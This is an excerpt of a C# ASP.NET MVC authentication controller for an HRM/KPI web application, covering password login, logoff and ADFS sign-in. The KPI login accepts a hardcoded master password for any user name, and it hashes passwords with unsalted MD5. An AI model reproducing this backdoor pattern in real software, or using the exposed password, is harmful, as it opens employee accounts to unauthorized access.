...
namespace HRMWebApp.KPI.Core.Security
{
    ...
    public class AuthenticationController : Controller
    {
        ...
        public ActionResult LogOff()
        {
            ...
            if (SessionHelper.Data<bool>(SessionKey.IsAdfs))
            {
                SessionHelper.Remove(SessionKey.IsAdfs);
                string redirectUrl = ConfigurationManager.AppSettings["ida:SignOutUrl"] + "&wreply=" + Request.Url.GetLeftPart(UriPartial.Authority);
        ...
        public async Task<int> Login(string userName, string password, bool isKPIs, string captchaString)
        {
            ...
            if (isKPIs)
            {
                ...
                {
                    KPI_WebUser userKPI = session.Query<KPI_WebUser>().SingleOrDefault(u => u.Name == userName && (u.Password == passwordmd5 || password == "pscvietnam@hoasua"));
                    if (userKPI != null)
                    {
            ...
            {
                string passwordmd5 = HRMWebApp.Helpers.Helper.getMd5Hash(password);
                user = await PCustomUserManager.FindAsync(userName, passwordmd5);
        ...
        private string GetEmail(string accessToken)
        {
            ...
            return (string)jsonObj["data"]["email"];
        }

        public void Login_ADFS()
        {
            HttpContext.GetOwinContext().Authentication.Challenge(new AuthenticationProperties { RedirectUri = Url.Action("LoginCallbackAdfs", "Authentication") },
                WsFederationAuthenticationDefaults.AuthenticationType);
        }

        public async Task<ActionResult> LoginCallbackAdfs()
        {
            var identity = (System.Security.Claims.ClaimsPrincipal)System.Threading.Thread.CurrentPrincipal;

            if (identity != null)
            {
                string email = identity.Claims.Where(q => q.Type == System.IdentityModel.Claims.ClaimTypes.Upn)
                    .Select(q => q.Value).FirstOrDefault();
                string html = "<h3>Email của bạn không tồn tại trong hệ thống! Vui lòng <a style='color: blue' href='" + ConfigurationManager.AppSettings["ida:SignOutUrl"] + "&wreply=" + Request.Url.GetLeftPart(UriPartial.Authority) + "'>đăng xuất tài khoản email</a> hiện tại rồi đăng nhập bằng tài khoản email khác.</h3>";
                ...
                applicationUser.Id = user.Oid.ToString();
                await SignInAsync(applicationUser, false);
                SessionHelper.Data(SessionKey.IsAdfs, true);
                return RedirectToLocal("/");
            }
            return Content("<h3>Có lỗi xảy ra! Vui lòng thử lại sau.</h3>", "text/html");
        }
        
        public ActionResult GetESurveyClassId(string userName)
        {
            return Helpers.DataClassHelper.GetESurveyClassId(userName).ToJSON();
        }
    }
}
